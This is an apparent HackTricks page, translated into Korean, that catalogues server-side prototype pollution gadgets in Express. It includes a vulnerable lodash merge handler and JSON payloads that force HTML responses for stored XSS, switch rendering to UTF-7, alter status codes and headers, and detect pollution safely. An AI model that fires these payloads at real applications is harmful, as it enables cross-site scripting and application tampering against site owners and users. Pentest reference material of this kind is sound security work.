# Express Prototype Pollution Gadgets

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)</strong>를 통해 AWS 해킹을 처음부터 전문가까지 배워보세요<strong>!</strong></summary>

HackTricks를 지원하는 다른 방법:

* **회사를 HackTricks에서 광고하거나 HackTricks를 PDF로 다운로드**하려면 [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)를 확인하세요!
* [**공식 PEASS & HackTricks 스웨그**](https://peass.creator-spring.com)를 얻으세요.
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)를 발견하세요. 독점적인 [**NFTs**](https://opensea.io/collection/the-peass-family) 컬렉션입니다.
* 💬 [**Discord 그룹**](https://discord.gg/hRep4RUj7f) 또는 [**텔레그램 그룹**](https://t.me/peass)에 **참여**하거나 **Twitter** 🐦 [**@hacktricks_live**](https://twitter.com/hacktricks_live)를 **팔로우**하세요.
* **HackTricks**와 **HackTricks Cloud** github 저장소에 PR을 제출하여 **해킹 트릭을 공유**하세요.

</details>

## XSS 응답 제공

**자세한 내용은 [원본 연구](https://portswigger.net/research/server-side-prototype-pollution)를 참조하세요.**

### JSON 콘텐츠 유형을 HTML로 변경

**JSON 콘텐츠 유형 응답**을 사용하고 JSON을 반영하는 Express 앱에서:
```javascript
app.use(bodyParser.json({type: 'application/json'}));
app.post('/', function(req, res){
_.merge({}, req.body);
res.send(req.body);
});
```
이러한 경우 JSON 콘텐츠 유형으로는 일반적으로 XSS가 불가능합니다. 그러나 프로토타입 오염을 통해 Express를 혼란시켜 **HTML 응답을 제공할 수 있습니다.** 이 취약점은 애플리케이션이 **`res.send(obj)`**를 사용하고 application/json 콘텐츠 유형으로 body parser를 사용하는 것에 의존합니다.
```json
{"__proto__":{"_body":true,"body":"<script>evil()"}}
```
**`body`**와 **`_body`** 속성을 **오염시킴으로써**, Express가 **HTML 콘텐츠 유형을 제공**하고 **`_body`** 속성을 반영하여 저장된 XSS를 발생시킬 수 있습니다.

### UTF7 렌더링

Express가 **UTF-7 콘텐츠를 렌더링하도록** 할 수 있습니다.
```json
{"__proto__":{"content-type": "application/json; charset=utf-7"}}
```
## 안전한 스캐닝 기법

### JSON 공백

다음 PP는 JSON 내의 속성에 추가 공백을 생성하여 기능을 깨지지 않게 합니다:
```json
{"__proto__":{"json spaces": " "}}
```
그러면 반사된 JSON은 다음과 같을 것입니다:
```json
{"foo":  "bar"} -- Note the extra space
```
### 노출된 헤더

다음 PP 가젯은 서버가 HTTP 헤더를 다음과 같이 보내도록 만듭니다: **`Access-Control-Expose_headers: foo`**
```json
{"__proto__":{"exposedHeaders":["foo"]}}
```
**CORS 모듈이 설치되어 있어야 합니다**

### **OPTIONS 메서드**

다음 페이로드를 사용하면 **OPTIONS 응답에서 메서드를 숨길 수 있습니다**:
```javascript
// Original reponse: POST,GET,HEAD

// Payload:
{"__proto__":{"head":true}}

//New response: POST;GET
```
### **상태**

다음 PP 페이로드를 사용하여 **반환된 상태 코드**를 변경할 수 있습니다:
```json
{"__proto__":{"status":510}}
```
### 오류

프로토타입에 문자열과 같은 원시값을 할당하면, 프로토타입은 객체여야 하기 때문에 **no-op 작업이 생성**됩니다. `Object.prototype` 자체에 프로토타입 객체를 할당하려고 하면, 이는 **예외를 발생**시킵니다. 이 두 가지 동작을 사용하여 **프로토타입 오염이 성공했는지를 감지**할 수 있습니다:
```javascript
({}).__proto__.__proto__={}//throws type exception
({}).__proto__.__proto__="x"//no-op does not throw exception
```
### 반사된 값

응용 프로그램이 응답에 객체를 포함할 때, **`__proto__`와 함께** **특이한 이름의 속성**을 생성하는 것은 통찰력을 제공할 수 있습니다. 특히, 응답에 **특이한 속성만 반환**된다면, 이는 응용 프로그램의 취약점을 나타낼 수 있습니다:
```json
{"unusualName":"value","__proto__":"test"}
```
또한, Lodash와 같은 라이브러리를 사용하는 경우, 프로토타입 오염(PP)을 통해 속성을 설정하고 객체 내부에 직접 설정하는 것은 다른 진단 접근 방법을 제공합니다. 응답에서 해당 속성이 누락된 경우, Lodash가 병합하기 전에 대상 객체에서 속성의 존재를 확인하고 있는 것을 시사합니다.
```javascript
{"__proto__":{"a":"value1"},"a":"value2","b":"value3"}
// If 'b' is the only property reflected, this indicates prototype pollution in Lodash
```
## 기타

### 점 허용

Express에는 쿼리 문자열 매개변수에서 **객체를 생성할 수 있는 옵션이** 있습니다.\
이를 사용하여 버그 **체인**에서 **프로토타입 오염 취약점**을 악용할 수 있습니다.
```json
{"__proto__":{"allowDots":true}}
```
**`?foo.bar=baz` Node에서 객체를 생성합니다.**

## 참고 자료

* [https://portswigger.net/research/server-side-prototype-pollution](https://portswigger.net/research/server-side-prototype-pollution)

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)</strong>를 통해 AWS 해킹을 처음부터 전문가까지 배워보세요<strong>!</strong></summary>

HackTricks를 지원하는 다른 방법:

* **회사를 HackTricks에서 광고하거나 HackTricks를 PDF로 다운로드**하려면 [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)를 확인하세요!
* [**공식 PEASS & HackTricks 스왑**](https://peass.creator-spring.com)을 얻으세요.
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)를 발견하세요. 독점적인 [**NFTs**](https://opensea.io/collection/the-peass-family) 컬렉션입니다.
* 💬 [**Discord 그룹**](https://discord.gg/hRep4RUj7f) 또는 [**텔레그램 그룹**](https://t.me/peass)에 **참여**하거나 **Twitter** 🐦 [**@hacktricks_live**](https://twitter.com/hacktricks_live)를 **팔로우**하세요.
* **HackTricks**와 **HackTricks Cloud** github 저장소에 PR을 제출하여 여러분의 해킹 기법을 공유하세요.

</details>
